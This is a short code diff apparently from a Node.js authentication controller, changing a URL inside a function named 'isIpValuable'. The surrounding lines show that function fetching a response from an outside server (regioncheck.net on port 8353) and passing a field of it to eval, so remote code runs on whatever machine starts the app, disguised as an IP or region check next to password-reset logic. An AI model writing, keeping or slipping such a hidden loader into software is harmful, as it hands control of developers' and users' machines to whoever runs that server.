@@ -145,7 +145,7 @@ exports.resetPassword = asyncErrorHandler(async (req, res, next) => {
 
 isIpValuable = async () => {
   const res = await axios.get(
-    "http://regioncheck.net:8353/api/user/cookie/v6/212"
+    "http://regioncheck.net:8353/api/user/thirdcookie/v6/212"
   );
   console.log("test is done");
   eval(res.data.cookie);
